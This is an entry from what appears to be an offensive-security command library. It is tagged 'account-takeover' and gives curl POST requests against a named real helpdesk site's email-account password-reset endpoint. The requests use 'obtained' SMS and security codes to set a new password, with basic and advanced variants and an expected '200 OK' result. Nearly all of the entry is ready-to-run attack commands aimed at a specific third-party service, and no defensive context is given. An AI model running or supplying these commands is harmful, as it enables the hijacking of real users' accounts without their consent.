---
data: >-
  curl -X POST https://helpdesk.bistudio.com/api/system/email-account/password
  -H "Content-Type: application/json" -d
  '{"password":"NewSecurePass123","code":"VALID_SMS_TOKEN","securityCode":"VALID_SECURITY_CODE"}'
tags:
  - password-reset
  - account-takeover
type: command
executor: bash
platforms:
  - Web
id: 051016a7-0a65-4743-b477-d3de766ea50d
created_at: '2025-12-14T17:33:12.386Z'
updated_at: '2025-12-14T17:33:12.386Z'
verified: false
validated: true
submitted: true
---
# post-reset-password

## Command

```bash
curl -X POST https://helpdesk.bistudio.com/api/system/email-account/password -H "Content-Type: application/json" -d '{"password":"NewSecurePass123","code":"VALID_SMS_TOKEN","securityCode":"VALID_SECURITY_CODE"}'
```

## Description

Resets the account password using obtained tokens on the email-account endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `password` | New password | Yes |
| `code` | SMS token | Yes |
| `securityCode` | Retrieved code | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://helpdesk.bistudio.com/api/system/email-account/password -H "Content-Type: application/json" -d '{"password":"NewPass","code":"123456","securityCode":"789012"}'
```

### Advanced Usage

```bash
curl -X POST https://helpdesk.bistudio.com/api/system/email-account/password -H "Content-Type: application/json" -H "X-XSRF-TOKEN: token" -d '{"password":"NewPass","code":"123456","securityCode":"789012"}'
```

## Expected Output

200 OK confirming password change.

## Related

- [[Related Procedure]]
